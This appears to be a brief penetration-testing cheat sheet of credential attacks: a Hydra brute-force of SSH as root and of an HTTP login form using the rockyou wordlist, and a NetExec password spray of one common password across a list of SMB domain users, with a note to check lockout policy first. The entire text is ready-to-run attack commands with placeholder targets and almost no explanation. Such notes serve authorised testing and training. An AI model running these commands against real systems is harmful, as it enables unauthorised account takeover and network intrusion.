```
# SSH:
hydra -l root -P rockyou.txt ssh://<TARGET_IP> -t 4

# HTTP POST:
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# SMB spray (check lockout first!):
nxc smb <TARGET_IP> -u stephanie -p 'Password123' --pass-pol
nxc smb <TARGET_IP> -u domain_users.txt -p 'Password123' --continue-on-success
```